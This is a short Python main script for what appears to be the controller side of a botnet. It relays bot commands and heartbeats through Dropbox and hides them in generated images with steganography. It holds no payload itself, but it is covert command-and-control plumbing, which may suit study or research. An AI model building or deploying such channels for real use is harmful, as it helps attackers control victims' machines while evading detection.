import datetime
import uuid

from common.dataclasses.commands import CommandExecutionRequest, CommandType, CommandExecutionResult
from common.dataclasses.heartbeat import Heartbeat
from common.image_generators.image_generator import generate_image
from common.steganography import insert_command_result_into_image, insert_heartbeat_into_image

from master.src.dropbox_handler import init_dropbox_handler, upload_command_to_dropbox
from master.src.jobs.command_results_fetcher_job import start_command_results_fetcher_job
from master.src.jobs.heartbeat_fetcher_job import start_heartbeat_fetcher_job


def main():
    init_dropbox_handler()
    start_command_results_fetcher_job()
    # upload_command_to_dropbox(CommandExecutionRequest(command=CommandType.W, bot_id=uuid.uuid4(), param=""))
    start_heartbeat_fetcher_job()
    brh = insert_heartbeat_into_image(generate_image(640, 640),
                                      Heartbeat(bot_id=uuid.uuid4(), heartbeat_timestamp=datetime.datetime.now()))
    with open("../images/heart3.png", "wb") as out:
        out.write(brh)


if __name__ == '__main__':
    main()
